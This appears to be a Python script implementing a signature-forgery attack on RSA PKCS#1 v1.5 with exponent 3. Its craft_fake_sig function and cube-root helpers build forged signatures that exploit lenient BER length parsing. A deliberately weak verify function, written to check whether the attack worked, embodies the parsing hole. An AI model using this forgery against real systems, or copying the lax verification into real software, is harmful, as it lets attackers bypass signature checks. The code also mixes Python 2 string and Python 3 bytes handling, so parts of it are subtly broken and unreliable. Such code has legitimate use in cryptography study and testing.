import binascii
import random
import math

HASH_ASN1 = {
    'MD5': '\x30\x20\x30\x0c\x06\x08\x2a\x86\x48\x86\xf7\x0d\x02\x05\x05',
    'SHA-1': '\x30\x21\x30\x09\x06\x05\x2b\x0e\x03\x02\x1a\x05',
    'SHA-256': '\x30\x31\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05',
    'SHA-512': '\x30\x51\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x03\x05'
}

HASH_SIZE = {
    'MD5': 0x10,
    'SHA-1': 0x14,
    'SHA-256': 0x20,
    'SHA-512': 0x40
}


#verify allow us to check whether attack worked or not
#hash :      (byte string) to be equal to when signature is decrypted with pub key
#signature : (byte string) given from who signed the hash
#pub_key :   (big int) modulus in RSA
def verify(hash, signature, pub_key):
    n_bits = int(math.ceil(math.log(pub_key)/math.log(2.)))

    hash_int = int(binascii.hexlify(hash),16)
    signature_int = int(binascii.hexlify(signature),16)
    decrypted_int = pow(signature_int,3,pub_key)

    decrypted_hex = format(decrypted_int,'x')
    if len(decrypted_hex)%2 == 1:
        decrypted_hex = '0'+decrypted_hex
    decrypted_hex = '0'*(n_bits//4-len(decrypted_hex))+decrypted_hex
    decrypted = binascii.unhexlify(decrypted_hex)

    print("Signature deciphering : "+decrypted_hex)

    # signature  marker
    if decrypted[0:2] != b'\x00\x01':
        raise Exception('Bad signature or bad format')

    i = 3
    while decrypted[i] == b'\xff':
        i += 1

    if decrypted[i] != b'\x00':
        raise Exception('Bad signature or bad format')

    i += 1
    hash_type = 'None'
    for method in HASH_ASN1:
        if decrypted[i:i+len(HASH_ASN1[method])] == HASH_ASN1[method]:
            hash_type = method
            i += len(HASH_ASN1[method])
            break

    if hash_type == 'None':
        raise Exception('Hash type not supported or bad format')

    length,offset = BER_parse_length(decrypted[i:])

    i += offset
    if decrypted[i] != '\x04':
        raise Exception('Bad signature or bad format')

    i += 1
    length,offset = BER_parse_length(decrypted[i:])
    i += offset
    if hash != decrypted[i:i+length]:
         raise Exception('Verification failed')

    return True

def craft_fake_sig(hex_message,hash_type,N):
    n_bits = int(math.ceil(math.log(N)/math.log(2.)))

    prefix = "0001FFFFFFFFFFFFFFFF00"+binascii.hexlify(HASH_ASN1[hash_type])
    hash_length = HASH_SIZE[hash_type]

    garbage_size_before_04FF = n_bits//8-len(prefix)//2-len(hex_message)//2-130

    prefix += format(garbage_size_before_04FF|0x80,'x')

    cbrt_prefix = find_cube_root_prefix(prefix,n_bits)
    #cbrt_middle = find_cube_root_prefix("04FF",n_bits-garbage_size_before_04FF*8-len(prefix)*4) doesn't work : we must bf
    cbrt_suffix = find_cube_root_suffix(hex_message,N)

    min_bits = int(math.ceil(math.log(cbrt_suffix)/math.log(2.)))

    good = cbrt_prefix+cbrt_suffix+int(random.random()*(1<<60))*(1<<min_bits)
    final = i_to_s(root(good))
    while final[len(prefix)//2+garbage_size_before_04FF-1] != '\x04' or final[len(prefix)//2+garbage_size_before_04FF] != '\xff':
        good = cbrt_prefix+cbrt_suffix+int(random.random()*(1<<60))*(1<<min_bits)
        final = i_to_s(root(good))

    ret = i_to_s(good)
    return "\x00"*(n_bits//8-len(ret))+ret



def BER_parse_length(length_field):
    len_value = 0
    b = 0
    octet = ord(length_field[b:b+1])
    if(octet & 0x80):
        length_bytes = octet & 0x7F
        for i in range(length_bytes):
            b += 1
            octet = ord(length_field[b:b+1])
            len_value = (len_value << 8) | octet
            l = len_value
    else:
        l = octet
    b += 1
    return (l,b)

def i_to_s(h):
    tmp = format(h,'x')
    if len(tmp)%2==1:
        return binascii.unhexlify('0'+tmp)
    else:
        return binascii.unhexlify(tmp)

def root(a):
    return a*a*a

def find_cube_root(n):
    m = 0
    M = n
    while m<M:
        cur = (m+M)//2
        if cur**3 < n:
            m = cur+1
        else:
            M = cur
    return m

def find_cube_root_prefix(hex_prefix, total_length_bits) :
    to_compare_with = ''
    stillNull = True
    for i in range(len(hex_prefix)):
        if hex_prefix[i]=='0' and stillNull:
            pass
        elif hex_prefix[i] != '0':
            stillNull = False
        if not stillNull:
            to_compare_with += hex_prefix[i]
    to_compare_with = to_compare_with.lower()

    len_prefix_bits = len(hex_prefix)*4
    ok = False
    n_unknown_bits = 10
    while not ok and n_unknown_bits<2000:
        tmp = int(hex_prefix,16)*(2**n_unknown_bits)
        for j in range((total_length_bits-len_prefix_bits-n_unknown_bits)%3):
            tmp *= 2

        cb_sqrt = int(find_cube_root(int(tmp))*(2**((total_length_bits-len_prefix_bits-n_unknown_bits)//3)))

        to_compare = hex(cb_sqrt*cb_sqrt*cb_sqrt).replace('0x','').replace('L','')
        if to_compare[:len(to_compare_with)] == to_compare_with:
            print("Prefix cube root found with "+str(n_unknown_bits)+" additional bits")
            break
        n_unknown_bits += 5
    return cb_sqrt


def forge_suffix_odd(hash, hash_len_bits):
    y = 1
    mask = 1
    for i in range(1, hash_len_bits):
        mask = mask | (1<<i)
        if (((y*y*y)^hash) & mask) != 0:
            y = y + (1<<i)
    return y

def forge_suffix_even(hash, hash_len_bits, N):
    odd_hash = (hash+N) & ((1<<hash_len_bits)-1)
    residual = forge_suffix_odd(odd_hash, hash_len_bits)
    y = 0
    for i in range(int(math.log(N)/math.log(2)), hash_len_bits, -1):
        y = y | (1 << i)
        c = (y + residual)*(y + residual)*(y + residual)
        if (c > N) and (c < (2 * N)):
            break
        elif c > (2 * N):
            y = y & (~(1 << i))
    return (y + residual) % N

def find_cube_root_suffix(hex_hash, N):
    hash_len_bits = len(hex_hash)*4
    hash = int(hex_hash,16)
    if (hash & 1) == 0:
        return forge_suffix_even(hash, hash_len_bits, N)
    else:
        return forge_suffix_odd(hash, hash_len_bits)
